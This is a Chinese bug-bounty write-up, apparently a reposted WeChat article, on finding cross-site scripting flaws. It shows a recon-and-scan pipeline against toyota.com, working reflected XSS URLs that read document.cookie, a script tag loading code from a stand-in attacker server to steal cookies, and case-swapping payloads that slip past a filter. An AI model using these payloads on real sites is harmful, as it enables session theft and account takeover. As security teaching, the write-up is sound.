---
title: 让XSS漏洞无处遁形！0x1
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495561&idx=1&sn=833ec534a6c613773a4eb95593f3a122&chksm=e8a5e5eadfd26cfc8e77af1095f431d71dcee25e0012063b39412fc1a6388401316f0ffff45a&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-08-22
fetch_date: 2025-10-06T18:04:40.447446
---

# 让XSS漏洞无处遁形！0x1

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj7fhViaAlht1ebfCPbQsF5ZNjfQCaLia5GN7HicnicGqib8UcTa1PPo4byyCNTtTmEZC9Zb4eocIBEhIAQ/0?wx_fmt=jpeg)

# 让XSS漏洞无处遁形！0x1

迪哥讲事

以下文章来源于安全小白团
，作者安全小白团译文

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7ZYPdvvT3T11jM5VACxcwQM3z1O2UHknmqAdKb86rFicQ/0)

**安全小白团**
.

小白学习基地，教你网络安全如何从入门到放弃

forever young

不论昨天如何，都希望新的一天里，我们大家都能成为更好的人，也希望我们都是走向幸福的那些人

01

背景

安全小白团

今天我将讨论使用不同技术的多种跨站脚本(XSS) 攻击，这是我在参与各种漏洞赏金计划时发现的。

XSS：（跨站脚本）是一种安全漏洞，当攻击者向其他用户查看的网页中注入恶意脚本时，这种漏洞就会发生。XSS 攻击旨在在受害者浏览器的上下文中执行恶意脚本，从而使攻击者能够窃取敏感信息。例如，在 javascript 中，如果攻击者能够注入像这样的内容：

```
<script src=https://attacker_Server.com/attack.js></script> // 从攻击者服务器加载恶意 Java 脚本文件，该文件执行恶意操作，例如从受害者那里窃取敏感数据（如会话 cookie）和获取帐户接管。
```

02

XSS类型

安全小白团

**1. 反射型XSS**

是最简单的一种XSS。当应用程序在HTTP请求中接收数据，并以不安全的方式将该数据包含在响应中时，就会发生这种情况。例如：如果我们在网站中有一个用于过滤衣服的类别参数，比如“https://example.com?category=t-shirt”，并且这个值以不安全的方式被回显在响应中，如<p>t-shirt</p>，这意味着我们可以注入我们的恶意负载，如<p><script>alert(document.cookie)</script></p>，以获取会话cookie。

**2. DOM XSS**

当JavaScript从攻击者可控的来源（如URL）获取数据，并将其传递给支持动态代码执行的接收器（如eval()或innerHTML）时，会发生DOM型XSS。这使得攻击者能够执行恶意JavaScript。关于DOM，你需要深入了解的最重要的内容是它的来源和接收器。关于来源和接收器的更多信息，请查看

```
https://portswigger.net/web-security/cross-site-scripting/dom-based
```

**3. 存储型 XSS**

当应用程序从不受信任的来源接收数据，并以不安全的方式将其包含在后续的HTTP响应中时，就会发生存储型XSS。例如，假设一个网站允许用户提交对其他用户显示的博客文章的评论。攻击者提交恶意评论，这些评论将被存储在服务器上，当其他用户查看这些恶意评论时，攻击者将窃取他们的数据。

03

丰田中的严重DOM XSS

安全小白团

现在，我们有一个丰田的域名，我们需要收集该域名的子域。您可以使用像sublist3r 、subfinder、 asset finder、amass 等工具来收集子域名，然后使用httpx来过滤出活跃的子域名。

```
httpx -l subdomains.txt -o httpx.txt
```

接下来，我们从Wayback Machine和Common Crawl中收集URL。

```
echo "toyota.com" | gau --threads 5 >> Enpoints.txtcat httpx.txt | katana -jc >> Enpoints.txt
```

由于其中大部分可能是重复的，我们将使用以下命令来去除重复项：

```
cat Enpoints.txt | uro >> Endpoints_F.txt
```

```
gau：一个工具，可以从Wayback Machine中获取任何域名的已知URL。https://github.com/lc/gaukatana：一个专注于深度网络爬虫的强大工具。https://github.com/projectdiscovery/katanauro：一个很好的工具，用于从收集到的端点中过滤掉不相关/重复的内容。例如，如果我们有多个URL，如https://example.com?id=1和https://example.com?id=2，uro会将其过滤为仅一个URL。https://github.com/s0md3v/uro
```

注意：你可以使用自动化脚本来自动化执行之前提到的所有步骤，就像大多数安全研究人员所做的那样，以简化流程。在将来的文章中，我将分享我的脚本。

现在，我们有了大量的URL，需要筛选出有效的URL。我使用的是强大的gf工具，它可以根据提供的模式（例如XSS、SQLi、SSRF等模式的）来过滤URL。您可以使用 GitHub 中的任何公共模式，例如

```
https://github.com/tomnomnom/gfhttps://github.com/1ndianl33t/Gf-Patterns
```

并将它们添加到“~/.gf”目录中。

```
cat Endpoints_F.txt | gf xss >> XSS.txt用于获取可能容易受到XSS攻击的带有参数的URL。
```

接下来，我们将使用Gxss工具来查找那些值在响应中被反射的参数。

```
https://github.com/KathanP19/Gxsscat XSS.txt | Gxss -p khXSS -o XSS_Ref.txt
```

在这个过程中，你有两个选择：第一个是手动测试，或者使用XSS自动化工具并手动确认结果。由于我们的文件很大，因此我会使用Dalfox自动化XSS扫描器。

```
https://github.com/hahwul/dalfoxdalfox file XSS_Ref.txt -o Vulnerable_XSS.txt
```

我发现有一个存在漏洞的子域名，我们称之为sub.toyota.com，让我们看看发生了什么。

当我导航到漏洞URL时，我收到了一个弹窗消息。

```
https://sub.toyota.com/direcrory/?dir=</script><script>confirm(document.domain)</script>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaTUBcZpxWLDjRice1LdGWzAazwAPGTsepDsohfRMPNlP7Atna4815T1otuaTOBbX7LyyIicnHBeMc4Q/640?wx_fmt=png&from=appmsg)

当时，我很好奇这是否是唯一的漏洞参数，还是存在其他参数，以及为什么会发生这种情况。我发现了很多存在漏洞的参数。

我查看了响应，发现存在漏洞的参数在URL的源文件中存在于不同的JavaScript变量中，如“var returnUrl=”、“var applicationUri=”。你可以查看这段JavaScript代码来理解这个思路。

```
<script>  // Assuming the URL is http://test.com?param=test  var urlParams = new URLSearchParams(window.location.search);  var paramValue = urlParams.get('param');    // This will execute the script tag in the paramValue variable  document.write(paramValue)</script>
```

```
让我们发送以下URL来检查目标是否对cookies有任何防护措施：
```

```
https://sub.toyota.com/direcrory/?dir=</script><script>confirm(document.cookie)</script>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaTUBcZpxWLDjRice1LdGWzAaOxrjJCcXJzkwKKdX8YDbVT183Pf82ybhzBeiatm5Whnl3quHqXGdvWQ/640?wx_fmt=png&from=appmsg)

不幸的是，这意味着我可以对任何用户执行完整的账户接管（RXSS）。我已经详细报告了这个漏洞，并得到了确认。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaTUBcZpxWLDjRice1LdGWzAaWRPaGv69QtyyKczxkXF6ecMI5lHa1eFJEwINgPNUIkBQsec5IhqrMA/640?wx_fmt=png&from=appmsg)

04

背景漏洞赏金计划中的中等难度反射性XSS

安全小白团

关键字：隐藏参数——手动测试

反射型 XSS是最常见的漏洞之一，也相对容易发现，但我要谈谈我多次遇到的一些特殊情况。

在对targets.com进行侦察并收集所有相关信息后，我收集了各个URL。我发现了一个非常有趣的URL，给我展示了以下页面。

```
https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaTUBcZpxWLDjRice1LdGWzAaqfibPnCZatSHabN0Up9lfLoKrjcOtGF56q0eEoczricjZ2kl4ZrfEtmw/640?wx_fmt=png&from=appmsg)

当我导航到基础URL时，我收到了一个403 Forbidden（禁止访问）的错误。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaTUBcZpxWLDjRice1LdGWzAaKKarfdnL8bqUdXzGkdToe9K7mzIMSuFy591mmiaVJ4CtpL1bC6eRiccg/640?wx_fmt=png&from=appmsg)

我使用自定义的单词列表和dirsearch工具对基础URL和其他URL进行了模糊测试。

```
dirsearch -u https://tst2.dev.targets.com/ -w wordlist.txt -e php,cgi,htm,html,shtm,shtml,js,txt --random-agent
(-u) 用于指定目标网址；(-w) 用于指定自定义的单词列表；(-e) 用于指定要测试的不同文件扩展名；(--random-agent) 用于改变请求的用户代理。
```

但是，我并没有得到任何重要的结果。那么，关于隐藏参数我们该怎么做呢？让我们使用 Arjun 工具或 Param Miner 扩展来扫描，这些工具可以通过发送不同的请求（如 GET、POST、JSON、XML）来发现有效的查询参数。

```
https://github.com/s0md3v/Arjunhttps://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943
arjun -u https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php -m GET -wParameters_Fuzz.txt
(-u) 用于指定目标网址；(-m GET) 表示使用 GET 方法发送请求；(-w) 用于指定自定义的单词列表。
```

响应

![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaTUBcZpxWLDjRice1LdGWzAaecJfQiaMHrXNDAgnu8HpUdAQAKVLdqeWwXHdbNqA9fZlxcg1KT0zxiaw/640?wx_fmt=png&from=appmsg)

接下来，让我们针对 auth\_status 参数尝试不同的注入，如 XSS、SQLi 等。但为了不浪费时间，我将专注于反射型 XSS。

在参数值中注入 khxss 后，当我导航到

```
https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php?auth_status=%3Cscript%3Econfirm%285%29%3C%2Fscript%3E
```

时，它确实在响应中反射了，但我得到了 403 Forbidden 错误。

通常，绕过某些保护的第一种也是最简单的方法是尝试修改负载，比如改变编写负载的方式（如 <sCrIpT>alert(1)</ScRipt>）或使用 <scr<script>ipt> 等多种技巧。因为开发者在黑名单中可能只禁止了特定的词汇。你可以使用公共的单词列表来自动化这一过程。但当我尝试

```
https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php?auth_status=%3CsCriPt%3Econfirm%28documen.cookie%29%3C%2FScRipt%3E
```

时，它接受了，我们成功触发了 XSS。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaTUBcZpxWLDjRice1LdGWzAayqQmvYgedsneibUicPxY0xEyxQ2c9frvk4cOph0ZLybvLuwVI16AB9gA/640?wx_fmt=png&from=appmsg)

专业提醒：当你发现类似这样的漏洞时，请尝试看看子域名是否也易受同样的漏洞影响。这就是我在收集[\*.dev.targets.com]的子域名时所做的事情，我发现了大约四个易受攻击的子域名。但当我报告它们时，审查团队认为它们属于同一个漏洞，最终我获得了赏金。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaTUBcZpxWLDjRice1LdGWzAaEomHTM16pEqaI9XtS4CicZVeqgUicX761JASgqnBnbmKMzSyvHvCa06A/640?wx_fmt=png&from=appmsg)

注意：你可以使用ffuf工具对子域名进行模糊测试，只需使用完整的URL即可。

```
https://github.com/ffuf/ffufffuf -u "https://FUZZ.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php?auth_status=%3CsCriPt%3Econfirm%28documen.cookie%29%3C%2FScRipt %3E" -w 子域名.txt -c -v
```

## 技术交流

技术交流请加笔者微信:richardo1o1 (暗号:growing)

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## 往期回顾

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=...